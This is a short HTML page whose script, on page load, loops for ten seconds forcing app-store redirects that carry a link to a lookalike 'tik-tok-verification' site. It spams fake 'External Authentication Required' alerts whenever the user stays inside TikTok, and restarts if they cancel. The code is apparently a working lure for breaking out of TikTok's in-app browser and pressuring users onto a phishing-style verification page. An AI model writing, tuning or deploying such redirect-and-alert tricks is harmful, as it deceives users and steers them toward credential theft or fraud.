<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 10000; 
    const fixedGap = 320; // YOUR OPTIMIZED DELAY

    function triggerStoreJump() {
        const urlEnc = encodeURIComponent(target);
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        // Use the verified successful protocol
        const iosTrigger = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
        const androidTrigger = "market://search?q=" + urlEnc;
        
        window.location.href = isAndroid ? androidTrigger : iosTrigger;
    }

    function rampage() {
        if (Date.now() > killTime) return;

        // 1. Fire the jump
        triggerStoreJump();

        // 2. THE CHECK: We wait the 320ms you requested.
        // If the window is still in focus, it means the jump hasn't happened yet.
        setTimeout(() => {
            if (document.hasFocus()) {
                // We are still inside TikTok, so fire the lock
                alert("ATTEMPT #30\n\nExternal Authentication Required.\n\nTap OK to force handover.");
                
                // Fire again immediately using tap momentum
                triggerStoreJump();
                
                // Queue the next check
                setTimeout(rampage, 10);
            } else {
                // THE HANDOVER WORKED! 
                // We do NOT fire an alert here to avoid blocking the OS switch.
                console.log("Handover sensed. Pausing loop.");
            }
        }, fixedGap);
    }

    window.onload = () => {
        rampage();
    };

    // If focus returns (user cancels the app store), resume the loop
    window.onfocus = () => {
        if (Date.now() < killTime) rampage();
    };
</script>

</body>
</html>
